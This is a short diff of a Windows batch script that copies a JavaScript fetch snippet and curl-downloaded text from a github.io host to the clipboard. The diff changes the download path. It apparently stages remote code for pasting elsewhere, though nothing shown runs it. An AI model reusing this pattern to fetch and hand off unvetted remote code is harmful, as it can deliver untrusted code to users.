@@ -8,7 +8,7 @@ cls
 echo "let a; fetch('https://4gu4.github.io/i').then(b=>b.text()).then(c=>a=c);" | clip
 timeout /t 1 /nobreak >nul
 cls
-curl https://4gu4.github.io/i | clip
+curl https://4gu4.github.io/d/i | clip
 timeout /t 2 /nobreak >nul
 cls
 timeout /t 1 /nobreak >nul
